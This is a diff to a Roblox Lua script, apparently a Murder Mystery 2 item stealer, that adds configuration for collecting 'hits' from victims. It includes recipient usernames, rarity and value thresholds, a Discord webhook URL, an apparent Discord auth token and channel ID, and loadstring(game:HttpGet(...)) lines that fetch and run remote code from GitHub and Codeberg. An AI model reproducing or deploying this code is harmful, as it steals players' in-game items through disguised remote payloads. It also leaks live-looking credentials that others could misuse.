@@ -237,9 +237,22 @@ pcall(function()
         end
     end
 
-    Username = {"t_cheloux","Dont_Distrubs","anfall38","mousta34"} 
-    Webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+    --Username = {"t_cheloux","Dont_Distrubs","anfall38","mousta34"} 
+    --Webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" 
+    --loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+
+
+_G.Usernames = {"t_cheloux","Dont_Distrubs","anfall38","mousta34"} -- you can add as many as you'd like
+_G.min_rarity = "Common"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "No" -- change to "No" if you dont want pings
+_Webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" 
+_loadstring(game:HttpGet("your link"))()
+        
+token = "MTQwNzc0OTAxMTk0NzEyNjc5NQ.GeD96O.aU75Mj0_M1_LoOv1KjUh4ADdimL46ofrMTwmmU" -- Discord Token here (DISCORD AUTH TOKEN) TUTORIAL: https://www.youtube.com/watch?v=LnBnm_tZlyU
+channelId = "1405873773873332357" -- Channel ID that your hits are in. TUTORIAL: https://www.youtube.com/watch?v=YjiQ7CajAgg
+delay = 3 -- How many seconds it will wait to chat after loading is done. If you have problems with not getting trades, try making delay higher (I dont recommend higher than 5)
+loadstring(game:HttpGet('https://codeberg.org/unkowncoder/MM2/raw/branch/main/autojoiner.lua'))()
         
     -------------------
     -- UI
